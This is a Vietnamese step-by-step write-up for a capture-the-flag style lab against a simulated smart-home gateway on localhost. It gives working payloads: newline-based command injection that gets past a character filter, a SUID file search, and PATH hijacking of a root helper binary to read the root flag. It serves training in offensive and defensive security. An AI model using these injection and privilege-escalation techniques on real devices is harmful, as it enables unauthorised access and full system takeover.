# Hướng Dẫn Khai Thác Lab 4.2 Pro: The Mirai Target (Command Injection & PrivEsc)

Hệ thống **Nexus Gateway** là thiết bị điều khiển trung tâm của hệ thống Smart Home. Trong phiên bản này, hệ thống đã được cập nhật thêm một lớp "Security Filter" để ngăn chặn các lệnh tấn công cơ bản. Nhiệm vụ của bạn là bypass bộ lọc này và thực hiện leo thang đặc quyền để chiếm quyền root.

---

## 2. Các bước thực hiện

### Bước 1: Đăng nhập và Dò tìm lỗ hổng
Truy cập giao diện Web tại `http://127.0.0.1:8086/`.
*   Đăng nhập với tài khoản mặc định: `admin` / `123456`.
*   Truy cập menu **Diagnostic** để sử dụng công cụ Network Diagnostic.

### Bước 2: Bypass Security Filter (Command Injection)
Thử các cách injection thông thường như `127.0.0.1; id`. Bạn sẽ nhận được thông báo lỗi:
> "Security Alert: Malicious character detected in input string!"

Hệ thống đã chặn các ký tự `;`, `&`, `|`. Tuy nhiên, nó không chặn ký tự xuống dòng (Newline). Bạn có thể chèn lệnh bằng cách sử dụng ký tự `%0a` (mã URL cho Newline).

**Payload:**
```text
127.0.0.1
id
```
(Trong giao diện web, bạn cần nhập địa chỉ IP, sau đó nhấn **Enter** (xuống dòng) và nhập lệnh `id`).

**Kết quả:** Bạn sẽ thấy lệnh `id` được thực thi dưới quyền `uid=1000(iot_user)`.

### Bước 3: Lấy User Flag
Bây giờ, hãy dùng lỗ hổng này để đọc flag đầu tiên:
```bash
127.0.0.1
cat /home/user_flag.txt
```

### Bước 4: Leo thang đặc quyền (Privilege Escalation)
Hệ thống hiện tại bạn đang chiếm là quyền user thấp. Để lấy được Root Flag, bạn cần tìm cách leo thang.

1.  **Tìm kiếm các tệp SUID**: Các tệp này chạy với quyền của chủ sở hữu (root) thay vì người chạy lệnh.
    ```bash
    127.0.0.1
    find / -perm -4000 -type f 2>/dev/null
    ```
2.  **Phát hiện mục tiêu**: Bạn sẽ thấy tệp lạ `/usr/bin/iot_sys_helper`.
3.  **Phân tích lỗi PATH Hijacking**: Tệp này thực thi lệnh `uptime` mà không chỉ định đường dẫn tuyệt đối (không phải `/usr/bin/uptime`). Chúng ta có thể tạo một tệp `uptime` giả mạo.

**Thực hiện tấn công (toàn bộ nhập vào 1 lần, mỗi lệnh một dòng):**
```text
127.0.0.1
echo "cat /root/root_flag.txt" > /tmp/uptime
chmod +x /tmp/uptime
env PATH=/tmp:/usr/bin:/bin /usr/bin/iot_sys_helper
```

> **Lưu ý:** Không dùng `export PATH=$PATH` vì ký tự `$` bị bộ lọc chặn. Thay vào đó, dùng lệnh `env` để thiết lập PATH trực tiếp mà không cần ký tự đặc biệt nào.

**Kết quả:** Binary `iot_sys_helper` sẽ chạy tệp `/tmp/uptime` của bạn dưới quyền **root**, từ đó in ra **Root Flag**!

---
Chúc mừng bạn đã hoàn thành bài lab mức độ Pro!
